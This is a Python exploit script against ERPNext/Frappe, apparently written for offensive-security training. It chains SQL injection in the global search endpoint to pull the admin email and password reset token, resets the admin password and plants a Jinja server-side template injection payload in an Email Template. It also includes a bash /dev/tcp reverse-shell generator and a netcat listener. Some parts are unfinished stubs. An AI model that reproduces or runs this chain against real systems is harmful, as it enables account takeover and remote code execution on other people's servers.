import urllib3
import requests
import json
import subprocess

s = requests.session()
host = "http://erpnext:8000"
proxies = {
  "http": "http://127.0.0.1:8080"
}
headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }

def inject(payload):
    data = {"cmd": "frappe.utils.global_search.web_search",
			"text": "text",
			"scope": "text\" UNION ALL SELECT 1,2,3,4,%s#" % payload
	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
	    return response
    else:
	    print("[!] Error in inject method.")


def identifyCollation():
  collation_request = inject('COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"')
  data = json.loads(collation_request)
  collation_value = data['message'][0]['route']
  return collation_value

def getAdminMailAdress():
  adminEmailAdressResponse = inject("name COLLATE utf8mb4_general_ci FROM __Auth")
  data = json.loads(adminEmailAdressResponse)
  adminEmailAdressValue = data['message'][1]['route']
  return adminEmailAdressValue
  
def sendPasswordResetRequest(emailAdress):
  host = "http://erpnext:8000/"
  data = {'cmd': 'frappe.core.doctype.user.user.reset_password',
		      'user': emailAdress}
  s.post(host, data)
  #add assertion later

def getPasswordResetToken():
    data = {"cmd": "frappe.utils.global_search.web_search",
            "text": "text",
            "scope": "offsec_scope\" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"
  	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
      data = json.loads(response)
      print(response)
      tokenValue = data['message'][2]['route']
      print(response)
      return tokenValue
    else:
	    print("[!] Error in PRT method.")

def resetPassword(token):
	newpass = "QWERTYqwerty12345@"
	data = {'key': token,
          'old_password': '',
          'new_password': newpass,
          'logout_all_sessions': '1',
          'cmd': 'frappe.core.doctype.user.user.update_password'}
	request = s.post(host, data,proxies=proxies)
	response = request.text
	if request.status_code == 200:
		return newpass
	else:
		print("\n[!] Unexpected error.")

#response = inject("ascii('B')")
#collation = identifyCollation()
#test = inject("reset_password_key COLLATE utf8mb4_general_ci FROM tabUser")
#print(test)

# SSTI RCE PART

def readPopenId():
    createTemplateValue = "doc=%7B%22creation%22%3A%222024-07-03+01%3A57%3A46.402221%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22name%22%3A%22ssti_rce%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22ssti_rce%22%2C%22modified%22%3A%222024-07-03+02%3A14%3A01.750330%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22__last_sync_on%22%3A%222024-07-03T07%3A47%3A43.033Z%22%2C%22__unsaved%22%3A1%7D&action=Save"
    executeTemplateValue = "doc=%7B%22creation%22%3A%222024-07-03+01%3A57%3A46.402221%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22name%22%3A%22ssti_rce%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22ssti_rce%22%2C%22modified%22%3A%222024-07-03+02%3A14%3A01.750330%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22__last_sync_on%22%3A%222024-07-03T07%3A47%3A43.033Z%22%2C%22__unsaved%22%3A1%7D&action=Save"
    createTemplate("erpnext", createTemplateValue)
    response = triggerTemplate("erpnext", executeTemplateValue)

    #read all classes
    #convert to list with ids
    #find id of subprocess.popen

def createRevShell(host, port, filename):
    shell_command = f"bash -i >& /dev/tcp/{host}/{port} 0>&1\n"

    try:
        with open(filename, 'w') as f:
            f.write(shell_command)
        print(f"Reverse shell file ({filename}) created successfully.")
    except Exception as e:
        print(f"Failed to write shell command to {filename}: {e}")

def startListener(port):
    try:
        # Uruchomienie listenera netcat w nowym terminalu
        command = f"terminator -e 'nc -nlvp {port}; exec bash'"
        process = subprocess.Popen(command, shell=True)
        print(f"Netcat listener started on port {port} in a new terminal.")
        return process
    except Exception as e:
        print(f"Failed to start netcat listener: {e}")
        return None

def uploadShell():
  t=t

def createTemplate(rhost, templateValue):
  target = "http://%s:8000/api/method/frappe.desk.form.save.savedocs" % rhost
  templateValue = templateValue
  data = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22test%22%2C%22subject%22%3A%22rce2%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
  response = s.post(target, data=data, headers=headers)
  print(response.text)
def triggerTemplate(rhost, templateValue):
  target = "http://%s:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template" % rhost
  templateValue = templateValue
  data = "doc=%7B%22creation%22%3A%222024-07-03+01%3A57%3A46.402221%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22name%22%3A%22ssti_rce%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22ssti_rce%22%2C%22modified%22%3A%222024-07-03+02%3A14%3A01.750330%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22__last_sync_on%22%3A%222024-07-03T07%3A47%3A43.033Z%22%2C%22__unsaved%22%3A1%7D&action=Save"
  response = s.post(target, data=data, headers=headers)
  print(response.text)

  return response

#def rce():
  #upload shell
  #execute



#response = inject("ascii('B')")
#collation = identifyCollation()

#test = inject("reset_password_key COLLATE utf8mb4_general_ci FROM tabUser")
#print(test)
adminEmailAdress = getAdminMailAdress()
sendPasswordResetRequest(adminEmailAdress)
resetToken = getPasswordResetToken()
print(resetToken)
resetPassword(resetToken)
print(resetPassword)
#checkNewCredentialsValidity(username, password)
#createRevShell("192.168.45.190","4444","shell")
#startListener(4444)
#readPopenId()
createTemplate("erpnext", "test")
#checkNewCredentialsValidity(username, password)
#print(adminEmailAdress)
#print(resetToken)

#RCE THROUGH SSTI